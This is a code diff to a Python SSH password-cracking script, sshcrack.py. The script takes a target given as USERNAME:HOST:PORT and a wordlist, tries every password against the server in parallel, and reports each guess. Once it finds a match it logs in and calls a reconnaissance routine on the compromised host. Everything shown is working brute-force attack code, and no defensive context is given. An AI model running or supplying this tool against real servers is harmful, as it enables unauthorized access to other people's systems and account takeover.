@@ -42,15 +42,15 @@ def perform_recon(ssh):
 
 if __name__ == '__main__':
     try:
-        word_arg = sys.argv[1]
-        user_arg = sys.argv[2]
-        host_arg = sys.argv[3]
-        port_arg = sys.argv[4]
+        account = sys.argv[1]
+        wordlist = sys.argv[2]
     except IndexError:
-        print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
+        print("Usage: sshcrack.py USERNAME:HOST:PORT WORDLIST")
         sys.exit(1)
 
-    word_pth = Path(__file__).parent / f"{word_arg}"
+    user, host, port = account.split(":")
+
+    word_pth = Path(__file__).parent / f"{wordlist}"
     if not word_pth.exists():
         print(f"Word list '{word_pth.name}' not found")
         sys.exit(1)
@@ -60,14 +60,15 @@ if __name__ == '__main__':
         for pw in f.read().split("\n"):
             pws.append(pw)
 
-    print(f"Loaded {len(pws)} passwords from '{word_pth.name}'")
+    lenpws = len(pws)
+    print(f"Loaded {lenpws} passwords from '{word_pth.name}'")
 
     clock_start = time.time()
     pool = multiprocessing.Pool(multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU)
 
     results = []
     for pw in pws:
-        args = (user_arg, host_arg, port_arg, pw)
+        args = (user, host, port, pw)
         results.append(pool.apply_async(connect, args))
 
     i = 0
@@ -75,11 +76,11 @@ if __name__ == '__main__':
         res, pw = result.get()
         i += 1
         if res:
-            print(f"({i}/{len(pws)}) Password is '{pw}'")
+            print(f"({i}/{lenpws}) Password is '{pw}'")
             pool.terminate()
             break
         else:
-            print(f"({i}/{len(pws)}) Password is not '{pw}'")
+            print(f"({i}/{lenpws}) Password is not '{pw}'")
 
     clock_end = time.time()
     pool.close()
@@ -89,7 +90,7 @@ if __name__ == '__main__':
 
     ssh = pxssh.pxssh()
     ssh.force_password = True
-    ssh.login(host_arg, user_arg, pw, port=port_arg)
+    ssh.login(host, user, pw, port=port)
     perform_recon(ssh)
     print("Logging out.")
     ssh.logout()
